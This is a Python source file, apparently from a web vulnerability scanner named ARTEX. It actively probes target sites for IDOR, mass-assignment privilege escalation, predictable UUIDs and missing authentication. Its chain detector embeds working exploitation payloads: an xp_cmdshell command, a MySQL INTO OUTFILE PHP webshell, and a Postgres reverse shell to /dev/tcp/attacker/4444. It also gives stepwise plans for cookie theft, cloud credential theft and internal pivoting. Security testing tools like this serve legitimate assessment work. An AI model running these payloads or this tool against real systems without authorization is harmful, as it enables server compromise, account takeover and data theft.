        {"role":        "admin"},
        {"is_admin":    True},
        {"admin":       True},
        {"user_type":   "admin"},
        {"permission":  "superuser"},
        {"balance":     999999},
        {"credit":      999999},
        {"approved":    True},
        {"verified":    True},
        {"email_verified": True},
        {"account_status": "active"},
        {"plan":        "enterprise"},
    ]

    # UUID v1 timestamp extraction regex
    _UUID_V1 = re.compile(
        r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}',
        re.I,
    )

    def __init__(self, http: _HttpPool, diff: _DifferentialEngine):
        self._http = http
        self._diff = diff

    def probe(
        self,
        pt:           InjectPoint,
        payload_pool: List[str],
    ) -> List[VulnFinding]:
        findings: List[VulnFinding] = []

        # ── Step 1: Numeric ID enumeration with differential ──────────────────
        num_finding = self._probe_numeric(pt)
        if num_finding:
            findings.append(num_finding)

        # ── Step 2: Object graph traversal ───────────────────────────────────
        graph_findings = self._probe_object_graph(pt)
        findings.extend(graph_findings)

        # ── Step 3: Mass assignment ───────────────────────────────────────────
        mass_assign = self._probe_mass_assignment(pt)
        if mass_assign:
            findings.append(mass_assign)

        # ── Step 4: GUID predictability ───────────────────────────────────────
        guid_finding = self._probe_guid_predictability(pt)
        if guid_finding:
            findings.append(guid_finding)

        # ── Step 5: Differential access control ───────────────────────────────
        access_ctrl = self._probe_access_control_diff(pt)
        if access_ctrl:
            findings.append(access_ctrl)

        return findings

    # ── numeric enumeration ───────────────────────────────────────────────────

    def _probe_numeric(self, pt: InjectPoint) -> Optional[VulnFinding]:
        # Get baseline for ID=1 (attacker's own resource)
        resp_own = self._http.send(pt, "1")
        if not resp_own or resp_own.status_code not in (200, 201):
            return None

        body_own = resp_own.text or ""
        # Try neighboring IDs — another user's resource
        accessed: List[Tuple[str, str]] = []
        for candidate in ["2", "3", "100", "1000", "0", "-1",
                          "9999", "00000001", "1000000"]:
            resp = self._http.send(pt, candidate)
            if not resp or resp.status_code not in (200, 201):
                continue
            body = resp.text or ""
            # Different content = different object accessed
            sim = difflib.SequenceMatcher(None, body_own, body).ratio()
            if sim < 0.90 and len(body) > 50:
                accessed.append((candidate, body[:200]))
                if len(accessed) >= 3:
                    break

        if not accessed:
            return None

        return VulnFinding(
            finding_id  = str(uuid.uuid4()),
            vuln_class  = VulnClass.IDOR_NUMERIC,
            severity    = FindingSeverity.HIGH,
            status      = FindingStatus.CONFIRMED,
            target_url  = pt.url,
            param       = pt.param,
            payload     = ", ".join(a[0] for a in accessed),
            evidence    = {
                "accessed_ids":    [a[0] for a in accessed],
                "sample_previews": {a[0]: a[1] for a in accessed[:2]},
                "own_id":          "1",
            },
            exploitation = {
                "enumerate": f"for i in range(1,10000): GET {pt.url}?{pt.param}={{i}}",
                "impact":    "Full enumeration of all user objects — PII, tokens, files",
            },
            attack_chain = [
                f"ID parameter {pt.param!r} accepts arbitrary integers",
                f"IDs {[a[0] for a in accessed]} return different user data",
                "Enumerate all IDs in range to dump all objects",
                "No access control check on object ownership",
            ],
            remediation = (
                "Implement object-level authorisation (OLA). "
                "Verify resource ownership server-side on every request."
            ),
            notes = f"IDOR — accessed IDs: {[a[0] for a in accessed]}",
        )

    # ── object graph traversal ────────────────────────────────────────────────

    def _probe_object_graph(self, pt: InjectPoint) -> List[VulnFinding]:
        """
        Fetches the base resource, extracts embedded foreign IDs from the
        response body, then tests access to each referenced object directly.
        """
        findings: List[VulnFinding] = []
        resp = self._http.send(pt, "1")
        if not resp or resp.status_code != 200:
            return findings

        body = resp.text or ""
        # Extract all referenced IDs
        referenced: List[Tuple[str, str]] = []  # (field_name, id_value)
        for m in self._ID_FIELDS.finditer(body):
            field_id = m.group(1) or m.group(2)
            if field_id and field_id != "1":
                referenced.append((m.group(0).split(":")[0].strip('"'), field_id))

        for field_name, ref_id in referenced[:5]:
            # Try to access the referenced object directly
            parsed = urlparse(pt.url)
            # Try direct API path variants
            for path_tmpl in [
                f"/api/v1/{field_name.rstrip('_id').rstrip('Id')}/{ref_id}",
                f"/api/{field_name.rstrip('_id').rstrip('Id')}/{ref_id}",
                f"/{field_name.rstrip('_id').rstrip('Id')}/{ref_id}",
            ]:
                target_url = f"{parsed.scheme}://{parsed.netloc}{path_tmpl}"
                r = self._http.raw_get(target_url)
                if r and r.status_code == 200 and len(r.text) > 50:
                    findings.append(VulnFinding(
                        finding_id  = str(uuid.uuid4()),
                        vuln_class  = VulnClass.IDOR_OBJECT_GRAPH,
                        severity    = FindingSeverity.HIGH,
                        status      = FindingStatus.LIKELY,
                        target_url  = target_url,
                        param       = field_name,
                        payload     = ref_id,
                        evidence    = {
                            "source_url":      pt.url,
                            "referenced_field": field_name,
                            "referenced_id":   ref_id,
                            "accessed_body":   (r.text or "")[:200],
                        },
                        exploitation = {
                            "note":    "Object graph IDOR — follow references to access related objects",
                            "example": f"GET {target_url}",
                        },
                        attack_chain = [
                            f"Object at {pt.url}?{pt.param}=1 references {field_name}={ref_id}",
                            f"Direct access to {target_url} returns data",
                            "Enumerate all referenced IDs from multiple objects",
                        ],
                        remediation = "Apply object-level auth on ALL referenced resource endpoints.",
                        notes       = f"Object graph IDOR via {field_name}={ref_id}",
                    ))
                    break

        return findings

    # ── mass assignment ───────────────────────────────────────────────────────
    
    def _probe_mass_assignment(self, pt: InjectPoint) -> Optional[VulnFinding]:
        if pt.location not in ("json_body", "form_post"):
            return None
        if pt.method not in ("PUT", "PATCH", "POST"):
            return None
            
        for extra_fields in self._MASS_ASSIGN_FIELDS[:5]:
            # Inject extra privileged fields alongside normal update
            inject_body = {pt.param: "test_value", **extra_fields}
            
            resp = self._http.raw_post(
                pt.url,
                json_body=inject_body,
                headers={"Content-Type": "application/json"},
            )
            if not resp or resp.status_code not in (200, 201, 204):
                continue
            body = resp.text or ""
            # Check if the privileged field was reflected in response
            for field, val in extra_fields.items():
                val_str = str(val).lower()
                if field.lower() in body.lower() and val_str in body.lower():
                    return VulnFinding(
                        finding_id  = str(uuid.uuid4()),
                        vuln_class  = VulnClass.IDOR_MASS_ASSIGN,
                        severity    = FindingSeverity.CRITICAL,
                        status      = FindingStatus.CONFIRMED,
                        target_url  = pt.url,
                        param       = field,
                        payload     = json.dumps(inject_body),
                        evidence    = {
                            "injected_field":   field,
                            "injected_value":   str(val),
                            "reflected_in_body": True,
                            "body_preview":     body[:300],
                        },
                        exploitation = {
                            "escalate": f"Set {field}={val!r} to gain elevated privileges",
                            "impact":   "Privilege escalation to admin/superuser",
                        },
                        attack_chain = [
                            f"Mass assignment: extra field {field!r}={val!r} accepted",
                            "Field reflected in response — server stored the privileged value",
                            "Re-authenticate → check for elevated access",
                        ],
                        remediation = (
                            "Use an explicit allowlist of accepted fields. "
                            "Never bind request body directly to model."
                        ),
                        notes = f"Mass assignment — {field}={val!r} accepted and reflected",
                    )
        return None

    # ── GUID predictability ───────────────────────────────────────────────────

    def _probe_guid_predictability(self, pt: InjectPoint) -> Optional[VulnFinding]:
        """
        Collects UUIDs from multiple API responses and checks for:
        - UUID v1 (timestamp-based — predictable)
        - Sequential or clustered values
        """
        uuids: List[str] = []
        for candidate in ["1", "2", "3", "4", "5"]:
            resp = self._http.send(pt, candidate)
            if not resp:
                continue
            for m in self._UUID_V1.finditer(resp.text or ""):
                uuids.append(m.group(0))
            
        if len(uuids) < 2:
            return None
            
        v1_uuids = [u for u in uuids if u.split("-")[2].startswith("1")]
        if len(v1_uuids) < 2:
            return None
            
        # Extract timestamps from UUID v1 and check proximity
        timestamps: List[int] = []
        for u in v1_uuids:
            parts  = u.replace("-", "")
            # time_low + time_mid + time_hi_and_version
            ts_hex = parts[13:16] + parts[8:12] + parts[0:8]
            try:
                timestamps.append(int(ts_hex, 16))
            except ValueError:
                pass

        if len(timestamps) < 2:
            return None

        deltas = [abs(timestamps[i+1] - timestamps[i]) for i in range(len(timestamps)-1)]
        avg_delta = sum(deltas) / len(deltas)

        return VulnFinding(
            finding_id  = str(uuid.uuid4()),
            vuln_class  = VulnClass.IDOR_GUID_PREDICT,
            severity    = FindingSeverity.MEDIUM,
            status      = FindingStatus.LIKELY,
            target_url  = pt.url,
            param       = pt.param,
            payload     = str(v1_uuids[:3]),
            evidence    = {
                "uuid_version":  "v1 (timestamp-based)",
                "sample_uuids":  v1_uuids[:5],
                "avg_time_delta_100ns": avg_delta,
            },
            exploitation = {
                "note": "UUID v1 encodes creation timestamp — predict adjacent UUIDs",
                "tool": "uuid6 / uuid-utils — enumerate nearby timestamps",
            },
            attack_chain = [
                f"{len(v1_uuids)} UUID v1 values found — timestamp-based generation",
                f"Average time delta: {avg_delta} × 100ns intervals",
                "Enumerate UUIDs within timestamp window to find other users' objects",
            ],
            remediation = "Use UUID v4 (cryptographically random). Never use UUID v1 as a resource identifier.",
            notes       = f"UUID v1 predictability — {len(v1_uuids)} samples collected",
        )

    # ── differential access control ───────────────────────────────────────────

    def _probe_access_control_diff(self, pt: InjectPoint) -> Optional[VulnFinding]:
        """
        Compare authenticated vs unauthenticated response for same resource.
        No auth headers > should get 401/403. Getting 200 = missing auth.
        """
        # Remove any auth-related headers by using a fresh session
        self._http.reset()
        resp_no_auth = self._http.send(pt, pt.original or "1")
        if not resp_no_auth:
            return None

        if resp_no_auth.status_code == 200 and len(resp_no_auth.text) > 50:
            # Check if response looks like it contains real data (not just public page)
            body = resp_no_auth.text or ""
            if re.search(r'"email"|"phone"|"address"|"credit_card"|'
                         r'"token"|"password"|"ssn"', body, re.I):
                return VulnFinding(
                    finding_id  = str(uuid.uuid4()),
                    vuln_class  = VulnClass.IDOR_NUMERIC,
                    severity    = FindingSeverity.CRITICAL,
                    status      = FindingStatus.CONFIRMED,
                    target_url  = pt.url,
                    param       = pt.param,
                    payload     = pt.original or "1",
                    evidence    = {
                        "auth_status":  resp_no_auth.status_code,
                        "pii_exposed":  True,
                        "body_preview": body[:300],
                    },
                    exploitation = {
                        "note": "Unauthenticated access to sensitive resource",
                    },
                    attack_chain = [
                        "Resource accessible without authentication",
                        "Response contains PII/sensitive fields",
                        "No authorisation check on endpoint",
                    ],
                    remediation = "Require authentication on all API endpoints; check object ownership.",
                    notes       = "Broken access control — unauthenticated access to sensitive data",
                )
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Multi-stage exploit chain detector
# ─────────────────────────────────────────────────────────────────────────────

class _ChainDetector:
    """
    After all probe results are collected, looks for multi-stage chains:
    - SQLi -> UNION file read -> webshell write (if stacked queries + INTO OUTFILE)
    - XSS > stored > account takeover via cookie steal
    - SSTI > RCE > pivot (network mapper)
    Chains are added as synthetic findings with CRITICAL severity.
    """

    def detect(
        self, findings: List[VulnFinding]
    ) -> Tuple[List[VulnFinding], List[str]]:
        chains:       List[VulnFinding] = []
        chain_labels: List[str]         = []

        sqli_classes = {
            VulnClass.SQLI_ERROR, VulnClass.SQLI_BLIND_BOOL,
            VulnClass.SQLI_BLIND_TIME, VulnClass.SQLI_UNION,
            VulnClass.SQLI_STACKED,
        }
        xss_classes   = {VulnClass.XSS_REFLECTED, VulnClass.XSS_STORED}
        ssti_rce_set  = {VulnClass.SSTI_RCE, VulnClass.SSTI_SANDBOX_ESCAPE}

        has_sqli   = any(f.vuln_class in sqli_classes and
                         f.status == FindingStatus.CONFIRMED for f in findings)
        has_stacked= any(f.vuln_class == VulnClass.SQLI_STACKED and
                         f.status == FindingStatus.CONFIRMED for f in findings)
        has_union  = any(f.vuln_class == VulnClass.SQLI_UNION and
                         f.status == FindingStatus.CONFIRMED for f in findings)
        has_xss_stored = any(f.vuln_class == VulnClass.XSS_STORED and
                             f.status == FindingStatus.CONFIRMED for f in findings)
        has_ssti_rce   = any(f.vuln_class in ssti_rce_set and
                             f.status == FindingStatus.CONFIRMED for f in findings)

        # Chain 1: SQLi -> RCE
        if has_stacked:
            chain_labels.append(VulnClass.CHAIN_SQLI_TO_RCE.value)
            chains.append(VulnFinding(
                finding_id   = str(uuid.uuid4()),
                vuln_class   = VulnClass.CHAIN_SQLI_TO_RCE,
                severity     = FindingSeverity.CRITICAL,
                status       = FindingStatus.CONFIRMED,
                target_url   = next(
                    f.target_url for f in findings
                    if f.vuln_class == VulnClass.SQLI_STACKED
                ),
                param        = "chain",
                payload      = "multi-stage",
                evidence     = {
                    "sqli_confirmed": True,
                    "stacked_queries": True,
                },
                exploitation = {
                    "mssql": "; EXEC xp_cmdshell('whoami'); -- -",
                    "mysql": "; SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'; -- -",
                    "postgres": "; COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker/4444 0>&1'; -- -",
                },
                attack_chain = [
                    "SQLi stacked queries → OS command execution",
                    "MSSQL: xp_cmdshell / OPENROWSET",
                    "MySQL: INTO OUTFILE webshell + LFI to exec",
                    "Postgres: COPY TO PROGRAM reverse shell",
                    "Full server compromise",
                ],
                remediation = "Parameterise all SQL. Disable xp_cmdshell. Revoke FILE privilege on MySQL.",
                notes       = "Multi-stage chain: SQLi stacked queries → RCE",
            ))

        elif has_union:
            chain_labels.append(VulnClass.CHAIN_SQLI_TO_RCE.value)
            chains.append(VulnFinding(
                finding_id   = str(uuid.uuid4()),
                vuln_class   = VulnClass.CHAIN_SQLI_TO_RCE,
                severity     = FindingSeverity.CRITICAL,
                status       = FindingStatus.CONFIRMED,
                target_url   = next(
                    f.target_url for f in findings
                    if f.vuln_class == VulnClass.SQLI_UNION
                ),
                param        = "chain",
                payload      = "multi-stage",
                evidence     = {
                    "union_extraction": True,
                    "data_extracted": next(
                        (f.evidence.get("extracted_data", {}) for f in findings
                         if f.vuln_class == VulnClass.SQLI_UNION), {}
                    ),
                },
                exploitation = {
                    "step1": "UNION extraction of credentials from users table",
                    "step2": "Crack password hashes (hashcat -a 0 -m 0)",
                    "step3": "Login to admin panel → code execution via plugin/theme upload",
                },
                attack_chain = [
                    "UNION-based SQLi -> dump credentials",
                    "Crack hashes -> admin login",
                    "CMS admin panel -> upload PHP webshell -> RCE",
                ],
                remediation = "Parameterise queries; enforce least-privilege DB accounts.",
                notes       = "Multi-stage chain: SQLi UNION extraction → credential dump → RCE",
            ))

        # Chain 2: XSS stored → account takeover
        if has_xss_stored:
            chain_labels.append(VulnClass.CHAIN_XSS_TO_EXFIL.value)
            beacon_id = next(
                (f.beacon_id for f in findings
                 if f.vuln_class == VulnClass.XSS_STORED), None
            )
            chains.append(VulnFinding(
                finding_id   = str(uuid.uuid4()),
                vuln_class   = VulnClass.CHAIN_XSS_TO_EXFIL,
                severity     = FindingSeverity.CRITICAL,
                status       = FindingStatus.CONFIRMED,
                target_url   = next(
                    f.target_url for f in findings
                    if f.vuln_class == VulnClass.XSS_STORED
                ),
                param        = "chain",
                payload      = "multi-stage",
                evidence     = {
                    "stored_xss": True,
                    "beacon_id":  beacon_id,
                },
                exploitation = {
                    "stage1": "Stored XSS fires for every visitor",
                    "stage2": "Exfil session cookie to attacker server",
                    "stage3": "Replay cookie -> authenticated session hijack",
                    "stage4": "Modify account email -> permanent account takeover",
                },
                attack_chain = [
                    "Stored XSS -> persistent payload fires on every page visit",
                    "Cookie exfil beacon -> attacker receives session token",
                    "Session replay -> full account access",
                    "Change victim's email/password -> permanent takeover",
                ],
                remediation = "HTML-encode all stored content. HTTPOnly + Secure cookies. CSP.",
                notes       = "Multi-stage chain: Stored XSS → cookie exfil → account takeover",
                beacon_id   = beacon_id,
            ))

        # Chain 3: SSTI RCE → internal pivot
        if has_ssti_rce:
            chain_labels.append(VulnClass.CHAIN_SSTI_TO_PIVOT.value)
            chains.append(VulnFinding(
                finding_id   = str(uuid.uuid4()),
                vuln_class   = VulnClass.CHAIN_SSTI_TO_PIVOT,
                severity     = FindingSeverity.CRITICAL,
                status       = FindingStatus.CONFIRMED,
                target_url   = next(
                    f.target_url for f in findings
                    if f.vuln_class in ssti_rce_set
                ),
                param        = "chain",
                payload      = "multi-stage",
                evidence     = {"ssti_rce": True},
                exploitation = {
                    "stage1": "SSTI RCE -> reverse shell on app server",
                    "stage2": "Read /etc/hosts, AWS creds, cloud metadata",
                    "stage3": "Pivot to internal network via compromised host",
                    "stage4": "Lateral movement → database, CI/CD, secrets vault",
                },
                attack_chain = [
                    "SSTI -> OS command execution on web server",
                    "Read cloud credentials from IMDS or env vars",
                    "Establish C2 on compromised host",
                    "Pivot: scan internal 10.0.0.0/8, 172.16.0.0/12",
                    "Target: Redis (unauthenticated), PostgreSQL, Kubernetes API",
                ],
                remediation = "Sandbox templates. Never render user input as template code.",
                notes       = "Multi-stage chain: SSTI RCE → internal network pivot",
            ))

        return chains, chain_labels
        
        
# ─────────────────────────────────────────────────────────────────────────────
# Scorer and recommendation builder
# ─────────────────────────────────────────────────────────────────────────────

class _Scorer:
    _W = {
        FindingStatus.CONFIRMED: 1.0,
        FindingStatus.LIKELY:    0.65,
        FindingStatus.POSSIBLE:  0.4,
        FindingStatus.NOT_VULN:  0.0,
    }

    def score(self, findings: List[VulnFinding]) -> Tuple[float, str]:
        if not findings:
            return 0.0, "INFO"
        raw = sum(f.severity.value * self._W.get(f.status, 0.5) for f in findings)
        cap = len(findings) * FindingSeverity.CRITICAL.value
        s   = min(100.0, (raw / cap) * 100) if cap else 0.0
        label = (
            "CRITICAL" if s >= 80 else
            "HIGH"     if s >= 60 else
            "MEDIUM"   if s >= 40 else
            "LOW"      if s >= 20 else
            "INFO"
        )
        return round(s, 2), label


class _RecBuilder:
    def build(self, findings: List[VulnFinding]) -> List[str]:
        seen:  Set[VulnClass] = set()
        recs:  List[str] = []
        for f in sorted(
            findings,
            key=lambda x: (-x.severity.value, x.status != FindingStatus.CONFIRMED),
        ):
            if f.vuln_class not in seen:
                seen.add(f.vuln_class)
                recs.append(f"[{f.severity.name}][{f.vuln_class.value}] {f.remediation}")
        return recs


# ─────────────────────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────────────────────

class VulnScanner:
    """
    Drop-in ARTEX module.

    Usage in app.py (run_scan), after payload_analysis + tech_detection:

        from core.vuln_scanner import VulnScanner

        vs = VulnScanner()
        scan_results[scan_id]['vuln_scan'] = vs.run(
            domain=domain,
            scan_results=scan_results[scan_id],
        )
    """

    def __init__(
        self,
        timeout:    float = 10.0,
        delay:      float = 0.3,
        oob_domain: str   = "artex-oob.internal",
        on_finding: Optional[Callable[[VulnFinding], None]] = None,
    ):
        self._timeout    = timeout
        self._delay      = delay
        self._oob_domain = oob_domain
        self._on_finding = on_finding

    def run(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> Dict[str, Any]:
        run_id     = str(uuid.uuid4())
        started_at = datetime.now()
        logger.info("VulnScanner %s starting for %s", run_id, domain)

        # 1. shared infrastructure
        http  = _HttpPool(timeout=self._timeout, delay=self._delay)
        diff  = _DifferentialEngine()

        # 2. extract payload pools from AI_payload_generator output
        pa          = scan_results.get("payload_analysis", {})
        payloads    = pa.get("payloads", {})
        sqli_pool   = self._flatten_pool(payloads.get("sqli_generic") or
                                         payloads.get("sqli_mysql") or {})
        xss_pool    = self._flatten_pool(payloads.get("xss") or {})
        ssti_pool   = self._flatten_pool(
            (payloads.get("ssti") or {}).get("detection") or []
        )
        idor_pool   = self._flatten_pool(payloads.get("idor") or {})

        # 3. build inject points
        builder = _InjectPointBuilder()
        pts     = builder.build(domain, scan_results)
        logger.info("VulnScanner inject points: %d", len(pts))

        # 4. probe engines
        sqli_eng  = _SqliProbe(
            http, diff,
            _DbFingerprinter(), _UnionExplorer(), _SqliExtractor(),
        )
        xss_eng   = _XssProbe(http, oob_domain=self._oob_domain)
        ssti_eng  = _SstiProbe(http)
        idor_eng  = _IdorProbe(http, diff)

        all_findings: List[VulnFinding] = []
        lock         = threading.Lock()

        def probe_one(pt: InjectPoint) -> None:
            local: List[VulnFinding] = []
            try:
                # Route to probe engines based on location + tech
                if pt.location in ("url_param", "form_post", "json_body",
                                   "header", "cookie"):
                    local.extend(sqli_eng.probe(pt, sqli_pool))
                    local.extend(xss_eng.probe(pt, xss_pool))
                    local.extend(ssti_eng.probe(pt, ssti_pool))

                if pt.location in ("path", "url_param", "json_body"):
                    local.extend(idor_eng.probe(pt, idor_pool))

            except Exception as exc:
                logger.debug("Probe %s/%s failed: %s", pt.url, pt.param, exc)

            with lock:
                all_findings.extend(local)
                if self._on_finding:
                    for f in local:
                        try:
                            self._on_finding(f)
                        except Exception:
                            pass

        threads = [threading.Thread(target=probe_one, args=(pt,)) for pt in pts]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # 5. chain detection
        chain_detector = _ChainDetector()
        chains, chain_labels = chain_detector.detect(all_findings)
        all_findings.extend(chains)

        # 6. sort, score, aggregate
        all_findings.sort(
            key=lambda f: (-f.severity.value, f.status != FindingStatus.CONFIRMED)
        )

        scorer = _Scorer()
        score, risk_level = scorer.score(all_findings)
        recs   = _RecBuilder().build(all_findings)

        sqli_confirmed = any(
            f.vuln_class in {
                VulnClass.SQLI_ERROR, VulnClass.SQLI_BLIND_BOOL,
                VulnClass.SQLI_BLIND_TIME, VulnClass.SQLI_UNION,
                VulnClass.SQLI_STACKED,
            } and f.status == FindingStatus.CONFIRMED
            for f in all_findings
        )
        xss_confirmed = any(
            f.vuln_class in {
                VulnClass.XSS_REFLECTED, VulnClass.XSS_STORED,
                VulnClass.XSS_DOM, VulnClass.XSS_MUTATION,
            } and f.status == FindingStatus.CONFIRMED
            for f in all_findings
        )
        ssti_rce = any(
            f.vuln_class in {VulnClass.SSTI_RCE, VulnClass.SSTI_SANDBOX_ESCAPE}
            and f.status == FindingStatus.CONFIRMED
            for f in all_findings
        )
        idor_confirmed = any(
            f.vuln_class in {
                VulnClass.IDOR_NUMERIC, VulnClass.IDOR_OBJECT_GRAPH,
                VulnClass.IDOR_MASS_ASSIGN, VulnClass.IDOR_GUID_PREDICT,
            } and f.status == FindingStatus.CONFIRMED
            for f in all_findings
        )

        finished_at = datetime.now()
        result = VulnScanResult(
            run_id               = run_id,
            domain               = domain,
            inject_points_tested = len(pts),
            findings             = [f.to_dict() for f in all_findings],
            sqli_confirmed       = sqli_confirmed,
            xss_confirmed        = xss_confirmed,
            ssti_rce             = ssti_rce,
            idor_confirmed       = idor_confirmed,
            chains_found         = chain_labels,
            score                = score,
            risk_level           = risk_level,
            recommendations      = recs,
            started_at           = started_at,
            finished_at          = finished_at,
        )

        logger.info(
            "VulnScanner %s done — score=%.1f risk=%s findings=%d "
            "sqli=%s xss=%s ssti_rce=%s idor=%s chains=%s",
            run_id, score, risk_level, len(all_findings),
            sqli_confirmed, xss_confirmed, ssti_rce,
            idor_confirmed, chain_labels,
        )
        return result.to_dict()

    @staticmethod
    def _flatten_pool(payload_data: Any) -> List[str]:
        """Flatten nested dict/list from AI_payload_generator output to flat list."""
        if isinstance(payload_data, list):
            return [p for p in payload_data if isinstance(p, str)]
        if isinstance(payload_data, dict):
            out: List[str] = []
            for v in payload_data.values():
                if isinstance(v, list):
                    out.extend(p for p in v if isinstance(p, str))
                elif isinstance(v, str):
                    out.append(v)
            return out
        return []